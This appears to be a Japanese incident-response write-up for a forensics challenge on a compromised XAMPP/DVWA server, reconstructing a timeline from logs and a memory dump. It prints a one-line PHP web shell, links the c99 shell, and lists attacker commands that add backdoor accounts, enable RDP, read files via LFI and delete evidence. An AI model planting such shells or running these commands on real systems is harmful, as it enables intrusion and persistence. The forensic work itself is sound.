[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep webshells
"22709744"      "5"     "2015/09/03 07:14:48.103652"    "0.031250"      "webshells.zip" "CREATE|EXTEND|OVERWRITE|INFO|CLOSE"    "ARCHIVE"       "62331" "12859" ""
"22710184"      "2"     "2015/09/03 07:14:51.338027"    "0.000000"      "webshells\"    "CREATE|CLOSE"  "FOLDER"        "62332" "12859" ""
"22710344"      "5"     "2015/09/03 07:14:51.384902"    "0.000000"      "c99.php"       "CREATE|EXTEND|INFO|CLOSE"      "ARCHIVE"       "62333" "62332" "webshells\"
"22710744"      "5"     "2015/09/03 07:14:51.463027"    "0.015625"      "webshell.php"  "CREATE|EXTEND|INFO|CLOSE"      "ARCHIVE"       "62334" "62332" "webshells\"
"22711184"      "3"     "2015/09/03 07:14:57.400527"    "0.000000"      "c99.php (62332 -> 12859)"      "MOVE"  "ARCHIVE"       "62333" "62332" "webshells\"
"22711424"      "3"     "2015/09/03 07:14:57.400527"    "0.000000"      "webshell.php (62332 -> 12859)" "MOVE"  "ARCHIVE"       "62334" "62332" "webshells\"
```

webshell.php

``` php
<?php
system($_GET["cmd"]);
?>
```

c99.php

https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php

`SHA-256    4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c`

VirusTotalにハッシュをぶち込むと有名なc99.phpと出してくれる．
https://www.virustotal.com/#/file/4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c/detection

![](https://i.imgur.com/N5rnqxr.png)

`c99.php`を実行した際のエラーがphp_error_logに残っているのでこの時間には実行されたというのが確認出来る．

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep c99.php
[03-Sep-2015 09:19:32 Europe/Berlin] PHP Parse error:  syntax error, unexpected '}' in C:\xampp\htdocs\DVWA\c99.php on line 2565
```

他にも，/xampp/htdocs/DVWA/hackable/uploads下に`phpshell.php`，`php2shell.php`が設置されている．
![](https://i.imgur.com/87dgVpF.png)

access.logを見ると，`abc`ディレクトリを作成するコマンドを受け付けていたのは`phpshell.php`だということが判明．
![](https://i.imgur.com/TVbbm6X.png)

php_error_logにも`phpshell.php`の痕跡が残っている．

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep phpshell.php
[03-Sep-2015 09:15:58 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
[03-Sep-2015 09:15:58 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
[03-Sep-2015 09:16:03 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
[03-Sep-2015 09:16:03 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
[03-Sep-2015 09:18:58 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
[03-Sep-2015 09:18:58 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
```

### TimeLine

正直，UTCとかがごちゃごちゃで間違っている気さえする．

Web Server Caseということもあり，apache logをかなり見てしまった．良いのか．
|       日時(UTC)          |           事象                                                                     |        ソース       　             |      備考    　                                    |
|------------------------|----------------------------------------------------------------------------------|--------------------------------|-------------------------------------------------|
|  2015/09/02 08:52:29   |  /dvwa/vulnerabilities/exec/へのHTTP通信開始                                           |  apache access.log             |  UAと時間的にこのくらいの時間                                |
|  2015/09/02 ??:??:??   |  コマンド実行net user user1 user1 /add(user1作成)                                        |  メモリダンプ(console)　              |  /dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?   |
|  2015/09/02 09:05:06   |  user1アカウントの作成                                                                   |       　SAM       　             |                                                 |
|  2015/09/02 ??:??:??   |  コマンド実行net localgroup "Remote Desktop Users" user1 /add(user1のRDPローカルグループの追加)    |  メモリダンプ(console)　              |  /dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?   |
|  2015/09/02 ??:??:??   |  コマンド実行netsh firewall set service type = remotedesktop enable(RDPの有効)            |  メモリダンプ(console)　              |  /dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?   |
|  2015/09/02 09:05:??   |  コマンド実行net user hacker hacker /add(hacker作成)                                     |  メモリダンプ(strings)　              |  /dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?   |
|  2015/09/02 09:05:25   |  hackerアカウントの作成                                                                  |        SAM        　            |                                                 |
|  2015/09/02 09:05:??   |  コマンド実行net localgroup "Remote Desktop Users" hacker /add(hacker作成)               |  メモリダンプ(strings)　              |  /dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?   |
|  2015/09/02 09:31:16   |  /windows/system32/drivers/etc/hostsの読み込み                                        |  apache access.log　            |  LFI                                            |
|  2015/09/02 09:33:23   |  /users/administrator/data.txtの読み込み                                              |  apache access.log　            |  LFI                                            |
|  2015/09/02 09:34:52   |  /xampp/phpmyadmin/config.incの読み込み                                               |  apache access.log, error.log　 |  LFI config.incはないconfig.inc.phpは現存する           |
|  2015/09/02 11:15:40   |  sqlmapでの攻撃開始                                                                    |  apache access.log             |                                                 |
|  2015/09/02 11:25:52   |  /xampp/htdocs/tmpukudk.phpの作成                                                   |  apache access.log             |  SQLinjection                                   |
|  2015/09/02 11:26:04   |  tmpbiwuc.phpの作成                                                                 |  apache_access.log             |  Python-urllib経由の様子                             |
|  2015/09/02 11:26:04   |  tmpbiwuc.phpでコマンド実行dir                                                          |  apache access.log             |                                                 |
|  2015/09/02 11:26:04   |  tmpbiwuc.phpでコマンド実行del /F /Q C:\xampp\htdocs	mpukudk.php(tmpukudk.phpの削除)       |  apache access.log             |                                                 |
|  2015/09/02 11:26:23   |  tmpbiwuc.phpでコマンド実行del /F /Q \xampp\htdocs\tmpbiwuc.php(tmpbiwuc.phpの削除)        |  apache access.log             |                                                 |
|  2015/09/03 06:52:24   |  /xampp/htdocs/tmpudvfh.phpの作成                                                   |  apache_access.log             |  SQLinjection                                   |
|  2015/09/03 06:52:2?   |  tmpbrjvl.phpの作成                                                                 |  apache_access.log             |  Python-urllib経由の様子                             |
|  2015/09/03 06:52:24   |  tmpbrjvl.phpでコマンド実行echo command execution test(テストコマンド)                         |  apache_access.log             |                                                 |
|  2015/09/03 06:59:38   |  tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\xampp\htdocs\tmpudvfh.php(tmpudvfh.php削除)   |  apache_access.log, UsnJrnl    |                                                 |
|  2015/09/03 06:59:38   |  tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\xampp\htdocs\tmpbrjvl.php(tmpbrjvl.php削除)   |  apache_access.log, UsnJrnl    |                                                 |
|  2015/09/03 07:14:48   |  webshells.zipの作成                                                                |  UsnJrnl                       |                                                 |
|  2015/09/03 07:16:13   |  phpshell.phpでコマンド実行dir                                                          |  apache access.log             |                                                 |
|  2015/09/03 07:17:49   |  phpshell.phpでコマンド実行dir c:\\                                                     |  apache access.log             |                                                 |
|  2015/09/03 07:17:58   |  phpshell.phpでコマンド実行mkdir abc                                                    |  apache access.log             |  これいる？                                          |
|  2015/09/03 07:18:02   |  phpshell.phpでコマンド実行dir                                                          |  apache access.log             |                                                 |
|  2015/09/03 07:21:37   |  c99でcmd実行                                                                       |  apache access.log             |  c99.php?act=cmdのリクエストが発生                       |

